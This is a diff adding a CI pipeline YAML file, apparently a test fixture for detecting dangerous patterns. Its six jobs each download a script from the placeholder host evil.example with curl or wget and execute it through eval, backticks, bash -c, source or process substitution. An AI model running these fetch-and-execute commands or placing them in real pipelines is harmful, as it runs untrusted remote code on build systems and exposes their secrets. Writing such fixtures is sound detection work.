@@ -1,0 +1,29 @@
+eval_dollar:
+  image: alpine:3.19
+  script:
+    - eval "$(curl -fsSL https://evil.example/eval-dollar.sh)"
+
+eval_dollar_unquoted:
+  image: alpine:3.19
+  script:
+    - eval $(wget -qO- https://evil.example/eval-wget.sh)
+
+eval_backtick:
+  image: alpine:3.19
+  script:
+    - eval `curl -s https://evil.example/eval-backtick.sh`
+
+shell_backtick:
+  image: alpine:3.19
+  script:
+    - bash -c "`curl -s https://evil.example/shell-backtick.sh`"
+
+source_procsub:
+  image: alpine:3.19
+  script:
+    - source <(curl -s https://evil.example/source.sh)
+
+dot_procsub:
+  image: alpine:3.19
+  script:
+    - . <(curl -s https://evil.example/dot.sh)
